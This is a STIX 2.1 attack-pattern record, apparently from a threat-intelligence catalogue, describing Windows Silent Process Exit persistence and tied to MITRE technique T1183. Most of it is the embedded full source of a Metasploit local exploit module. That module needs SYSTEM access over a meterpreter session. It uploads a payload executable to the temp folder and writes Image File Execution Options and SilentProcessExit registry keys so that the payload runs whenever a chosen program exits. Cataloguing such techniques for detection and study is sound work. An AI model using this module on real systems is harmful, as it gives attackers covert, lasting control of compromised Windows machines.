{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a0121ba9-9c19-49da-b8ad-3dca21ce1fe7",
    "created": "2024-08-14T16:49:26.182263Z",
    "modified": "2024-08-14T16:49:26.182267Z",
    "name": "Windows Silent Process Exit Persistence",
    "description": " Windows allows you to set up a debug process when a process exits. This module uploads a payload and declares that it is the debug process to launch when a specified process exits.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/persistence_image_exec_options.rb",
            "external_id": "persistence_image_exec_options.rb"
        },
        {
            "source_name": "reference",
            "url": "https://attack.mitre.org/techniques/T1183/"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Windows::Registry\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Silent Process Exit Persistence',\n        'Description' => %q{\n          Windows allows you to set up a debug process when a process exits.\n          This module uploads a payload and declares that it is the debug\n          process to launch when a specified process exits.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Mithun Shanbhag', # earliest author found\n          'bwatters-r7', # msf module\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          [ 'Automatic', {} ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2008-06-28',\n        'References' => [\n          ['URL', 'https://attack.mitre.org/techniques/T1183/'],\n          ['URL', 'https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/']\n        ],\n        'DefaultOptions' => {\n          'DisablePayloadHandler' => true\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n    register_options([\n      OptString.new('PAYLOAD_NAME',\n                    [false, 'The filename for the payload to be used on the target host (%RAND%.exe by default).', nil]),\n      OptString.new('PATH', [false, 'Path to write payload(%TEMP% by default).', nil]),\n      OptString.new('IMAGE_FILE', [true, 'Binary to \"debug\"', nil])\n\n    ])\n  end\n\n  def upload_payload(dest_pathname)\n    payload_exe = generate_payload_exe\n    write_file(dest_pathname, payload_exe)\n    vprint_status(\"Payload (#{payload_exe.length} bytes) uploaded on #{sysinfo['Computer']} to #{dest_pathname}\")\n  end\n\n  def validate_active_host\n    unless is_system?\n      fail_with(Failure::NoAccess, \"You must be System to run this Module\")\n    end\n\n    begin\n      print_status(\"Attempting Persistence on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}\")\n    rescue Rex::Post::Meterpreter::RequestError => e\n      elog(e)\n      raise Msf::Exploit::Failed, 'Could not connect to session'\n    end\n  end\n\n  def write_reg_keys(image_file, payload_pathname)\n    reg_keys = []\n    reg_keys.push(key_name: \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\#{image_file}\",\n                  value_name: \"GlobalFlag\",\n                  type: \"REG_DWORD\",\n                  value_value: 512)\n    reg_keys.push(key_name: \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SilentProcessExit\\\\#{image_file}\",\n                  value_name: \"ReportingMode\",\n                  type: \"REG_DWORD\",\n                  value_value: 1)\n    reg_keys.push(key_name: \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SilentProcessExit\\\\#{image_file}\",\n                  value_name: \"MonitorProcess\",\n                  type: \"REG_SZ\",\n                  value_value: payload_pathname)\n    silent_process_exit_key = \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SilentProcessExit\"\n    registry_createkey(silent_process_exit_key) unless registry_key_exist?(silent_process_exit_key)\n    reg_keys.each do |key|\n      registry_createkey(key[:key_name]) unless registry_key_exist?(key[:key_name])\n      vprint_status(\"Writing #{key[:value_name]} to #{key[:key_name]}\")\n      registry_setvaldata(key[:key_name], key[:value_name], key[:value_value], key[:type])\n      unless registry_getvalinfo(key[:key_name], key[:value_name])\n        print_error(\"Failed to set #{key[:value_name]} for #{key[:key_name]}\")\n        return false\n      end\n    end\n  end\n\n  def exploit\n    validate_active_host\n    payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))\n    temp_path = datastore['PATH'] || session.sys.config.getenv('TEMP')\n    image_file = datastore['IMAGE_FILE']\n    payload_pathname = temp_path + \"\\\\\" + payload_name + '.exe'\n    vprint_status(\"Payload pathname = #{payload_pathname}\")\n    upload_payload(payload_pathname) if write_reg_keys(image_file, payload_pathname)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-06-28",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}